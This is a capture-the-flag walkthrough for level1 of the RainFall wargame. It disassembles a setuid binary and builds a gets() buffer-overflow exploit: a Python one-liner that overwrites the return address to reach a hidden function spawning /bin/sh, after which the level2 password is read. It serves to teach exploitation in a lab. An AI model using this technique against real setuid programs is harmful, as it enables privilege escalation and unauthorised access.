# Level1

## Walkthrough

We list the files in the current home directory.

```bash
level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
level1@RainFall:~$ file level1 
level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
```

The file is owned by **level2** and has the **setuid** bit.

We list the functions inside the executable.

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

There are 2 user-defined functions: `main()` and `run()`.

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50
   0x08048489 <+9>:     lea    eax,[esp+0x10]
   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
```

The `main()` function calls `gets()` and stores the user input to `[esp + 0x10]`.

The `run()` function is never called.

```
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18
   0x0804844a <+6>:     mov    eax,ds:0x80497c0
   0x0804844f <+11>:    mov    edx,eax
   0x08048451 <+13>:    mov    eax,0x8048570
   0x08048456 <+18>:    mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:    mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:    mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:    mov    DWORD PTR [esp],eax
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret
End of assembler dump.
(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
```

The `run()` function:
- calls `fwrite()` to write `"Good... Wait what?\n"` on stdout
- calls `system()` to execute `/bin/sh`

As `main()` is calling `gets()`, we can exploit it with a **buffer overflow** in order to overwrite the `old eip` register, sitting at the start of the stack frame of `main()`, with the address of `run()`.

We draw a diagram of the `main()` stack frame.

![Stack diagram](./resources/level1_diagram1.png)

`gets()` doesn't perform any length validation. We must calculate the difference between the start of the `gets()` buffer and the `old eip` on the stack: 96 - 16 - 4 = 76.

We run a **Python** script onto the command line to print 76 characters and append them with 4 bytes representing the address of `run()`.  
Because our system is **little-endian**, we have to pass the address from the least-significant byte to the most-significant one: `0x08048444` becomes `0x44840408`.

```bash
level1@RainFall:~$ python -c "print('A' * 76 + '\x44\x84\x04\x08')" | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Our script is working because the message of `run()` is printed on stdout, but the shell process is instantly closed.  
After some researches, we find a solution using the `cat` command.

```bash
level1@RainFall:~$ (python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Resources

- [An Introduction to Buffer Overflow Vulnerability](https://freedium.cfd/https://medium.com/techloop/understanding-buffer-overflow-vulnerability-85ac22ec8cd3#:%7E:text=A%20Beginner%E2%80%99s%20Guide%20to%20Buffer%20Overflow%20Vulnerability%201,Overflow%20...%207%20Security%20Measures%20...%208%20References)
- [Running a Buffer Overflow Attack - Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo)
- [Buffer Overflows Part 1 - Jumping to Local Functions](https://www.youtube.com/watch?v=svgK9fNGTfg)
- [Why can't I open a shell from a pipelined process?](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process)
